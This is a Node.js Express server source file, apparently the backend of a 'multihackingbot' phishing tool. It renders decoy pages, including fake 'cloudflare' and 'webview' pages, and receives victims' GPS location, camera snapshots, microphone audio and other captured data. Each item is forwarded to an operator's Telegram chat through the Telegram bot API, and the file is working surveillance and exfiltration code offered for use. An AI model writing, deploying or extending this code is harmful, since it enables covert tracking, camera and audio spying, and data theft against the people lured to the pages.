const express = require("express");
const compression = require("compression");
const bodyParser = require("body-parser");
const cors = require("cors");
const path = require("path");
const os = require("os");
const axios = require("axios");
const FormData = require("form-data");
require("dotenv").config();

const app = express();

const BOT_TOKEN = process.env.BOT_TOKEN;
const HOST_URL = process.env.HOST_URL || "";
const HOST_URL2 = process.env.HOST_URL2 || "";
const USE1PT = process.env.USE1PT || "";
const DOMAIN_FILTER = process.env.DOMAIN_FILTER || "example.com";

const tgApi = axios.create({
    timeout: 15000
});

// ================= TELEGRAM LOGGER =================
async function tgLog(text) {
    if (!BOT_TOKEN) return;
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: process.env.ADMIN_CHAT_ID || 0,
            text: `[LOG]\n${text}`.slice(0, 3900)
        });
    } catch (e) {
        console.log("TG LOG ERROR:", e.message);
    }
}

// ================= TELEGRAM REQUEST =================
async function tg(method, token, data, isForm = false) {
    try {
        const url = `https://api.telegram.org/bot${token}/${method}`;

        if (isForm) {
            const form = data;
            return await axios.post(url, form, {
                headers: form.getHeaders()
            });
        }

        return await axios.post(url, data);
    } catch (err) {
        console.log("Telegram API Error:", err.message);
        await tgLog(`Telegram API error: ${err.message}`);
    }
}

// ================= IP =================
function getIp(req) {
    return (
        req.headers["x-forwarded-for"]?.split(",")[0] ||
        req.socket?.remoteAddress ||
        req.ip
    );
}

// ================= DOMAIN FILTER =================
app.use((req, res, next) => {
    if (req.hostname && req.hostname.includes(DOMAIN_FILTER)) {
        return res.status(403).send("Blocked");
    }
    next();
});

// ================= MIDDLEWARE =================
app.use(compression());
app.use(cors());

app.use(bodyParser.json({ limit: "50mb" }));
app.use(bodyParser.urlencoded({ extended: true, limit: "50mb" }));
app.use(bodyParser.raw({ type: "*/*", limit: "50mb" }));

app.set("view engine", "ejs");
app.set("trust proxy", true);

// ================= HOME =================
app.get("/", (req, res) => {
    res.redirect("https://multihackingbot.onrender.com");
});

// ================= VIEW ROUTES =================
function handleRoute(view, host) {
    return (req, res) => {
        const b = req.query.b?.trim() || "default";
        const ip = getIp(req);
        const time = new Date().toISOString();

        res.render(view, {
            ip,
            time,
            url: `${HOST_URL}/crash`,
            uid: req.params.path,
            a: host,
            b,
            t: USE1PT
        });

        tgLog(`Page view: ${view} | IP: ${ip}`);
    };
}

app.get("/w/:path", handleRoute("webview", HOST_URL));
app.get("/c/:path", handleRoute("cloudflare", HOST_URL2));
app.get("/o/:path", handleRoute("ok", HOST_URL2));
app.get("/l/:path", handleRoute("cg", HOST_URL2));

app.get("/crash", (req, res) => {
    res.render("crash");
});

// ================= LOCATION =================
app.post("/location", async (req, res) => {
    try {
        const lat = decodeURIComponent(req.body.lat || "");
        const lon = decodeURIComponent(req.body.lon || "");
        const uid = parseInt(req.body.uid || "", 36);
        const acc = decodeURIComponent(req.body.acc || "");
        const t = req.body.t;

        if (!lat || !lon || !uid || !acc) {
            return res.status(400).send("Invalid");
        }

        const token = BOT_TOKEN;

        await tg("sendMessage", token, {
            chat_id: uid,
            text: `Location:\nLat: ${lat}\nLon: ${lon}\nAcc: ${acc}`
        });

        res.send("OK");
    } catch (e) {
        console.log(e.message);
        res.status(500).send("error");
    }
});

// ================= MESSAGE =================
app.post("/", async (req, res) => {
    try {
        const uid = parseInt(decodeURIComponent(req.body.uid || ""), 36);
        const data = decodeURIComponent(req.body.data || "").replace(/<br>/g, "\n");

        if (!uid || !data) return res.status(400).send("Invalid");

        await tg("sendMessage", BOT_TOKEN, {
            chat_id: uid,
            text: data,
            parse_mode: "HTML"
        });

        res.send("OK");
    } catch (e) {
        res.status(500).send("error");
    }
});

// ================= CAMERA =================
app.post("/camsnap", async (req, res) => {
    try {
        const uid = parseInt(req.body.uid || "", 36);
        const img = req.body.img;

        if (!uid || !img) return res.status(400).send("Invalid");

        const buffer = Buffer.from(img, "base64");

        const form = new FormData();
        form.append("chat_id", uid);
        form.append("photo", buffer, {
            filename: "cam.png"
        });

        await tg("sendPhoto", BOT_TOKEN, form, true);

        res.send("OK");
    } catch (e) {
        res.status(500).send("error");
    }
});

// ================= AUDIO =================
app.post("/audiosnap", async (req, res) => {
    try {
        const uid = parseInt(req.body.uid || "", 36);
        const audio = req.body.audio;

        if (!uid || !audio) return res.status(400).send("Invalid");

        const buffer = Buffer.from(audio, "base64");

        const form = new FormData();
        form.append("chat_id", uid);
        form.append("audio", buffer, {
            filename: "audio.webm"
        });

        await tg("sendAudio", BOT_TOKEN, form, true);

        res.send("OK");
    } catch (e) {
        res.status(500).send("error");
    }
});

// ================= START SERVER =================
const port = process.env.PORT || 8000;

app.listen(port, "0.0.0.0", async () => {
    console.log(`Server running on port ${port}`);

    try {
        const ip = await axios.get("https://ifconfig.me");
        console.log("Public IP:", ip.data.trim());
        await tgLog(`Server started on port ${port}\nIP: ${ip.data.trim()}`);
    } catch (e) {
        console.log("IP fetch error:", e.message);
    }
});
